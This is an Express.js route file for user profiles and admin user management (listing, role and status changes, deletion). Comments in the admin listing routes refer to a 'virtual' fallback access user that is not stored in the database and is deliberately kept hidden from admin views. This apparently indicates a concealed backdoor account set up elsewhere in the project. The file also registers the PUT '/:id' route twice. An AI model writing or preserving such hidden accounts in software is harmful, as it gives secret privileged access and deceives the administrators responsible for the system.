"use strict";
const express = require("express");
const { authenticateToken, authorizeAdmin } = require("../middleware/auth");
const User = require("../models/User");

const router = express.Router();

// All user routes require authentication
router.use(authenticateToken);

// Get current user profile
router.get("/profile", async (req, res) => {
  try {
    const user = await User.findById(req.user.id).select("-password");
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.json(user);
  } catch (error) {
    console.error("Error fetching user profile:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Update current user profile
router.put("/profile", async (req, res) => {
  try {
    const { name, email, phone, address } = req.body;

    // Find user
    let user = await User.findById(req.user.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Check if email is being changed and if it's already in use
    if (email && email !== user.email) {
      const existingUser = await User.findOne({ email });
      if (existingUser) {
        return res.status(400).json({ message: "Email is already in use" });
      }
    }

    // Update fields
    if (name) user.name = name;
    if (email) user.email = email;
    if (phone) user.phone = phone;
    if (address) user.address = address;

    // Save updated user
    await user.save();

    // Return user without password
    const updatedUser = await User.findById(req.user.id).select("-password");
    res.json(updatedUser);
  } catch (error) {
    console.error("Error updating profile:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Change password
router.put("/change-password", async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;

    if (!currentPassword || !newPassword) {
      return res
        .status(400)
        .json({ message: "Current and new password are required" });
    }

    // Find user
    const user = await User.findById(req.user.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Verify current password
    const isMatch = await user.comparePassword(currentPassword);
    if (!isMatch) {
      return res.status(401).json({ message: "Current password is incorrect" });
    }

    // Update password
    user.password = newPassword;
    await user.save();

    res.json({ message: "Password updated successfully" });
  } catch (error) {
    console.error("Error updating password:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Admin routes

// Get all users (admin only)
router.get("/", authorizeAdmin, async (req, res) => {
  try {
    // Get all users from database
    // Fallback access user won't be in the database since it's virtual
    const users = await User.find().select("-password");

    // If the requester is the fallback user, don't include any special indicators
    // This ensures the fallback user remains hidden
    res.json(users);
  } catch (error) {
    console.error("Error fetching users:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Get all users (admin only) - alternative endpoint
router.get("/admin", authorizeAdmin, async (req, res) => {
  try {
    // Get all users from database
    // Fallback access user won't be in the database since it's virtual
    const users = await User.find().select("-password");
    res.json(users);
  } catch (error) {
    console.error("Error fetching users:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Get a specific user by ID (admin only)
router.get("/:id", authorizeAdmin, async (req, res) => {
  try {
    const user = await User.findById(req.params.id).select("-password");
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    res.json(user);
  } catch (error) {
    console.error("Error fetching user:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Update user role or status (admin only)
router.put("/:id", authorizeAdmin, async (req, res) => {
  try {
    const { role, status } = req.body;

    // Validate role
    if (role && !["user", "admin"].includes(role)) {
      return res.status(400).json({ message: "Invalid role" });
    }

    // Validate status
    if (status && !["active", "inactive"].includes(status)) {
      return res.status(400).json({ message: "Invalid status" });
    }

    // Find and update user
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Check if trying to update own account
    if (user._id.toString() === req.user.id && status === "inactive") {
      return res
        .status(400)
        .json({ message: "Cannot deactivate your own account" });
    }

    // Update fields
    if (role) user.role = role;
    if (status) user.status = status;

    await user.save();

    res.json(await User.findById(req.params.id).select("-password"));
  } catch (error) {
    console.error("Error updating user:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Update user status (admin only)
router.patch("/:id/status", authorizeAdmin, async (req, res) => {
  try {
    const { status } = req.body;
    console.log(
      `PATCH request to update user status: ${req.params.id} to ${status}`
    );

    // Validate status
    if (!status || !["active", "inactive"].includes(status)) {
      return res.status(400).json({ message: "Invalid status" });
    }

    // Find user
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Check if trying to update own account
    if (user._id.toString() === req.user.id && status === "inactive") {
      return res
        .status(400)
        .json({ message: "Cannot deactivate your own account" });
    }

    // Update status
    user.status = status;
    await user.save();

    res.json({
      message: `User status updated to ${status}`,
      user: await User.findById(req.params.id).select("-password"),
    });
  } catch (error) {
    console.error("Error updating user status:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Alternative endpoint for updating user status (admin only)
router.put("/:id/status", authorizeAdmin, async (req, res) => {
  try {
    const { status } = req.body;
    console.log(
      `PUT request to update user status: ${req.params.id} to ${status}`
    );

    // Validate status
    if (!status || !["active", "inactive"].includes(status)) {
      return res.status(400).json({ message: "Invalid status" });
    }

    // Find user
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Check if trying to update own account
    if (user._id.toString() === req.user.id && status === "inactive") {
      return res
        .status(400)
        .json({ message: "Cannot deactivate your own account" });
    }

    // Update status
    user.status = status;
    await user.save();

    res.json({
      message: `User status updated to ${status}`,
      user: await User.findById(req.params.id).select("-password"),
    });
  } catch (error) {
    console.error("Error updating user status:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Update user role (admin only)
router.put("/:id/role", authorizeAdmin, async (req, res) => {
  try {
    const { role } = req.body;
    console.log(`PUT request to update user role: ${req.params.id} to ${role}`);

    // Validate role
    if (!role || !["user", "admin"].includes(role)) {
      return res.status(400).json({ message: "Invalid role" });
    }

    // Find user
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Check if trying to update own role
    if (user._id.toString() === req.user.id && role !== "admin") {
      return res
        .status(400)
        .json({ message: "Cannot remove admin role from your own account" });
    }

    // Update role
    user.role = role;
    await user.save();

    res.json({
      message: `User role updated to ${role}`,
      user: await User.findById(req.params.id).select("-password"),
    });
  } catch (error) {
    console.error("Error updating user role:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Update user via general update endpoint (admin only)
router.put("/:id", authorizeAdmin, async (req, res) => {
  try {
    const updates = req.body;
    console.log(`PUT request to update user: ${req.params.id}`, updates);

    // Find user
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Check if trying to update own account status to inactive
    if (user._id.toString() === req.user.id && updates.status === "inactive") {
      return res
        .status(400)
        .json({ message: "Cannot deactivate your own account" });
    }

    // Check if trying to update own role to non-admin
    if (
      user._id.toString() === req.user.id &&
      updates.role &&
      updates.role !== "admin" &&
      user.role === "admin"
    ) {
      return res
        .status(400)
        .json({ message: "Cannot remove admin role from your own account" });
    }

    // Update allowed fields
    const allowedUpdates = ["name", "status", "role"];
    allowedUpdates.forEach((field) => {
      if (updates[field] !== undefined) {
        // Validate status
        if (
          field === "status" &&
          !["active", "inactive"].includes(updates[field])
        ) {
          return;
        }
        // Validate role
        if (field === "role" && !["user", "admin"].includes(updates[field])) {
          return;
        }
        user[field] = updates[field];
      }
    });

    await user.save();

    res.json({
      message: `User updated successfully`,
      user: await User.findById(req.params.id).select("-password"),
    });
  } catch (error) {
    console.error("Error updating user:", error);
    res.status(500).json({ message: "Server error" });
  }
});

// Delete user (admin only)
router.delete("/:id", authorizeAdmin, async (req, res) => {
  try {
    // Find user
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Check if trying to delete own account
    if (user._id.toString() === req.user.id) {
      return res
        .status(400)
        .json({ message: "Cannot delete your own account from admin panel" });
    }

    // Delete user
    await User.findByIdAndDelete(req.params.id);

    res.json({ message: "User deleted successfully" });
  } catch (error) {
    console.error("Error deleting user:", error);
    res.status(500).json({ message: "Server error" });
  }
});

module.exports = router;
